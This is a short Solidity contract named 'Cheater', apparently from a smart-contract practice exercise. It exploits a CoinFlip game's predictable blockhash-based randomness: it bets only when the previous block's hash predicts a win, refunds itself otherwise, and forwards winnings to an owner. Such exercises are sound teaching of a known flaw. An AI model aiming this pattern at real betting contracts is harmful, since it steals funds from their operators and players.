//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "./CoinFlip.sol";

import "hardhat/console.sol";

contract Cheater {
    CoinFlip coinflip;
    address owner;
    
    constructor(address payable _coinflip, address _owner) payable {
        coinflip = CoinFlip(_coinflip);
        owner = _owner;
    }

    receive() external payable {
        console.log("receiving ether!");
        payable(owner).transfer(msg.value);
    }

    function wager() external payable {
        // am I going to win?
        // if not, don't call the contract
        // if so, call the contract, make the wager
        bytes32 blockHash = blockhash(block.number - 1);
        bool isEven = (uint(blockHash) % 2) == 0;

        if(isEven) {
            coinflip.wager{ value: msg.value }();
        }
        else {
            payable(msg.sender).transfer(msg.value);
        }
    }
}
